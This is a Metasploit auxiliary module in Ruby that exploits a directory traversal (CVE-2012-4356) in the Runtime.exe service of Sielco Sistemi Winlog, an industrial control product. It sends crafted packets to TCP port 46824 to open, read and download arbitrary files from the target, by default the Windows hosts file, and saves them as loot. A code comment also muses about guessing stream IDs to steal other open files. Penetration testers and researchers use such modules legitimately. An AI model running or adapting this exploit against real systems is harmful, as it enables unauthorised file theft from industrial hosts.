##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sielco Sistemi Winlog Remote File Access',
      'Description'    => %q{
          This module exploits a directory traversal in Sielco Sistemi Winlog. The vulnerability
        exists in the Runtime.exe service and can be triggered by sending a specially crafted packet
        to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite
        2.07.14.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Luigi Auriemma', # Vulnerability Discovery and PoC
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4356' ],
          [ 'OSVDB', '83275' ],
          [ 'BID', '54212' ],
          [ 'EDB', '19409'],
          [ 'URL', 'http://aluigi.altervista.org/adv/winlog_2-adv.txt' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(46824),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/WINDOWS/system32/drivers/etc/hosts']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 10])
      ])
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("#{ip}:#{rport} - Please supply the name of the file you want to download")
      return
    end

    travs = "../" * datastore['DEPTH']
    if datastore['FILEPATH'][0] == "/"
      travs << datastore['FILEPATH'][1, datastore['FILEPATH'].length]
    else
      travs << datastore['FILEPATH']
    end

    connect

    # Open File through _TCPIPS_BinOpenFileFP
    packet = "\x00" * 20
    packet << "\x78" # Opcode
    packet << travs # Path traversal
    packet << "\x00"
    sock.put(packet)
    response = sock.get_once(5, 1) || ''

    if response.unpack("C").first != 0x78
      print_error "#{ip}:#{rport} - Error opening file"
      return
    end
    # The stream allows to identify our file since the
    # server could be handling multiple files simultaneously.
    # Since the stream identifier is just an offset in an array
    # of opened streams it could be used to guess other files
    # opened by the server and stole them :-) just an idea....
    stream = response[1, 4]

    # Get File Length through _TCPIPS_BinGetFileSizeFP
    packet = "\x00" * 20
    packet << "\x79" # Opcode
    packet << stream # stream
    packet << "\x00" * 7
    sock.put(packet)
    response = sock.get_once(5, 1) || ''

    if response.unpack("C").first != 0x79
      print_error "#{ip}:#{rport} - Error getting the file length"
      return
    end
    file_length = response[1,4].unpack("V").first


    # Read File with the help of _TCPIPS_BinGetStringRecordFP
    contents = ""
    offset = 0
    while contents.length < file_length
      packet = "\x00" * 20
      packet << "\x98" # Opcode
      packet << [offset].pack("V") # offset (blocks of 0x55)
      packet << stream # stream
      packet << "\x00" * 3
      sock.put(packet)
      response = ""

      while response.length < 0x7ac # Packets of 0x7ac (header (0x9) + block of data (0x7a3))
        response << sock.get_once(0x7ac-response.length, 5) || ''
      end
      if response.unpack("C").first != 0x98
        print_error "#{ip}:#{rport} - Error reading the file, anyway we're going to try to finish"
      end

      if (file_length - contents.length) < response.length - 9
        contents << response[9, file_length - contents.length] # last packet
      else
        contents << response[9, response.length] # no last packet
      end

      offset = offset + 0x17 # 17 blocks in every packet
    end

    # Close File through _TCPIPS_BinCloseFileFP
    packet = "\x00" * 20
    packet << "\x7B"
    packet << "\x00" * 11
    sock.put(packet)
    response = sock.get_once(-1, 1) || ''
    if response.unpack("C").first != 0x7B
      print_error "#{ip}:#{rport} - Error closing file file, anyway we're going to try to finish"
    end

    disconnect

    print_good "#{ip}:#{rport} - File retrieved successfully!"

    fname = File.basename(datastore['FILEPATH'])
    path = store_loot(
      'sielcosistemi.winlog',
      'application/octet-stream',
      ip,
      contents,
      fname,
      datastore['FILEPATH']
    )
    print_status("#{ip}:#{rport} - File saved in: #{path}")

  end
end
